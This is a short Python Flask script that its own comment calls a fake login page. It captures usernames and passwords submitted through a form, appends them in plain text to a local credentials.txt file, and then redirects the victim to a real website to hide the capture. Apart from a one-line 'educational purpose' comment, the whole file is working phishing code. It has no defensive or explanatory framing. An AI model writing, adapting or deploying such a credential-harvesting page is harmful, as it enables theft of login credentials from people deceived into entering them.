from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# Fake login page route
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        # Save credentials to a file (educational purpose)
        with open("credentials.txt", "a") as file:
            file.write(f"Username: {username}, Password: {password}\n")
        
        # Redirect to the real site after capture
        return redirect("https://www.google.com")  # Replace with a real website
        
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
